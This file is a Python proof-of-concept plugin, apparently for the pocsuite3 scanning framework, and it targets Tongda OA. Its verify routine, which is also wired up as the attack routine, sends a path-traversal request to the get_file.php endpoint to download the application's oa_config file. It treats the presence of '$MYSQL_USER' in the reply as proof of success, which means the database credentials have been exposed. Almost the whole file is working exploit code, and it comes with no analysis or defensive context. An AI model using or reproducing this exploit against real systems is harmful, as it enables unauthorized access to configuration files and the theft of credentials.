#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''通达OA_get_file_file-download'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''file-download'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''通达 OA'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self): 
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        verify_url = make_verify_url(self.url, "/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php", mod=0)
        resp = requests.get(verify_url, verify=False, timeout=15)
        if resp.status_code == 200 and b'$MYSQL_USER' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):       
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output                                              


register_poc(TestPOC)
